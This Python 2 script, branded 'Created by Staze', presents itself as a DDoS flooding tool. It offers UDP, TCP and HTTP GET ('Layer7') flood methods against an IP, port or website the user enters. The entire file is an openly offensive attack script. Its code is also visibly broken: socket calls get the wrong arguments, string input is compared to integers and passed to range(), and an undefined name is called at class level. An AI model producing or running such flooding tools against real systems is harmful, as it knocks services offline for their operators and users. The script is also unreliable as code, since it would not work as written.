import socket

print('   _  _  ______     _    _   ')
print(' _| || |_| ___ \   | |  | |  ')
print('|_  __  _| |_/ /___| | _| |_ ')
print(' _| || |_|    // _ \ |/ / __|')
print('|_  __  _| |\ \  __/   <| |_ ')
print('  |_||_| \_| \_\___|_|\_\\__|')
print('\tCreated by Staze')
print('\n\n')

udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
class ddos():

    def udp(self, ip, port, connection):
        self.ip = ip
        self.port = port
        self.connection = connection
        ipToFlood = raw_input('Enter IP: ')
        portToFlood = raw_input('Enter Port: ')
        connectionCount = raw_input('Enter Connection Count: ')
        if connectionCount<=0:
            connectionCount = 10
        for _ in range(connectionCount):
            udpSocket.send(ipToFlood, portToFlood)

    def tcp(self, ip, port, connection):
        self.ip = ip
        self.port = port
        self.connection = connection
        ipToFlood = raw_input('Enter IP: ')
        portToFlood = raw_input('Enter Port: ')
        connectionCount = raw_input('Enter Connection Count: ')
        if connectionCount<=0:
            connectionCount = 10
        for _ in range(connectionCount):
            tcpSocket.send(ipToFlood, portToFlood)
    def layer7(self, ip, connection, message):
        self.ip = ip
        self.connection = connection
        hostToFlood = raw_input('Enter Site: ')
        try:
            host = socket.gethostbyname(hostToFlood)
            while True:
                print('Attacking {0}:{1}').format(host, 80)
                tcpSocket.connect((host, 80))
                tcpSocket.send('GET / {0} HTTP/1.1\r\n').format(message)
                tcpSocket.sendto('GET / {0} HTTP/1.1\r\n'(ip, 80)).format(message)
                tcpSocket.send('GET / {0} HTTP/1.1\r\n').format(message)
        except socket.error:
            print('Could not flood.')
    def main(self, method):
        self.method = method
        method = ddos()
        choice = raw_input('Methods Available\n\t1) UDP\n\t2) TCP\n\t3) Layer7')
        if choice==1:
            ipToFlood = raw_input('Enter IP: ')
            portToFlood = raw_input('Enter Port: ')
            connectionCount = raw_input('Enter Connection Count: ')
            method.udp(ipToFlood, portToFlood, connectionCount)
        if choice==2:
            method.tcp(ipToFlood, portToFlood, connectionCount)
        if choice==3:
            hostToFlood = raw_input('Enter Site: ')
            messageToSend = raw_input('Enter Message You would like to send to webserver: ')
            connectionCount = raw_input('Enter Connection Count: ')
            method.layer7(hostToFlood, connectionCount, messageToSend)
        else:
            print('Methods Available\n\t1) UDP\n\t2) TCP\n\t3) Layer7')
    main(choice)
